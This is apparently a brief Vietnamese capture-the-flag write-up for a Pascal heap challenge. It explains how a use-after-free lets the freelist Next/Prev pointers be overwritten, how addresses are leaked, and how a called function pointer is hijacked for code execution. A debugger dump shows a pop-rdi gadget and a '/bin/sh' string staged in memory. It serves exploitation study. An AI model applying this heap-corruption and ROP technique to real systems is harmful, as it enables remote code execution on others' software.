# freemanpascal 
- bài được viết bằng pascal và sử dụng heap allocator của pascal
- bug nằm ở việc bị uaf
- trong chương trình có option để edit dữ liệu trong 1 chunk heap, vì thế có thể control được forward và backward pointer sau khi free 
```
The format of an entry in the freelist is as follows:

 PFreeRecord = ^TFreeRecord;  
 TFreeRecord = record  
   Size : longint;  
   Next : PFreeRecord;  
   Prev : PFreeRecord;  
 end;  
```
- bài cũng có hàm show để có thể leak địa chỉ 
- bằng việc overwrite next và prev có thể control được chunk tiếp theo khi allocate, và có thể allocate tới chỗ mong muốn 
- vì bài no-pie với việc gadgets khá là phong phú nên có thể sử dụng để rce, có thể overwrite 
- khi tạo 1 chunk sẽ có chứa 1 địa chỉ mà khi chọn option 5 thì chương trình sẽ call địa chỉ lên, vì vậy khi ghi đè được địa chỉ này là có thể rce
- điạ chỉ: 0x401090 (P$FREEMYMANUAF_$) ◂— push rbp
```c
07:0038│  0x7ffff7f99038 ◂— 0x380a1
andbg> 
08:0040│  0x7ffff7f99040 ◂— 0x3e /* '>' */
09:0048│  0x7ffff7f99048 ◂— 0
0a:0050│  0x7ffff7f99050 ◂— 0
0b:0058│  0x7ffff7f99058 ◂— 0
0c:0060│  0x7ffff7f99060 —▸ 0x7ffff7fa1170 —▸ 0x403e95 (fpc_shortstr_con) ◂— pop rdi
0d:0068│  0x7ffff7f99068 —▸ 0x403e95 (fpc_shortstr_con) ◂— pop rdi
0e:0070│  0x7ffff7f99070 —▸ 0x7ffff7fa1181 ◂— 0x68732f6e69622f /* '/bin/sh' */
0f:0078│  0x7ffff7f99078 ◂— 0x61616161616161 /* 'aaaaaaa' */
andbg> 
10:0080│  0x7ffff7f99080 ◂— 0
11:0088│  0x7ffff7f99088 ◂— 0
12:0090│  0x7ffff7f99090 ◂— 0
13:0098│  0x7ffff7f99098 ◂— 0
14:00a0│  0x7ffff7f990a0 ◂— 0
15:00a8│  0x7ffff7f990a8 ◂— 0
16:00b0│  0x7ffff7f990b0 ◂— 0
17:00b8│  0x7ffff7f990b8 ◂— 0
andbg> 
18:00c0│  0x7ffff7f990c0 ◂— 0
19:00c8│  0x7ffff7f990c8 —▸ 0x401090 (P$FREEMYMANUAF_$) ◂— push rbp
1a:00d0│  0x7ffff7f990d0 ◂— 0
```
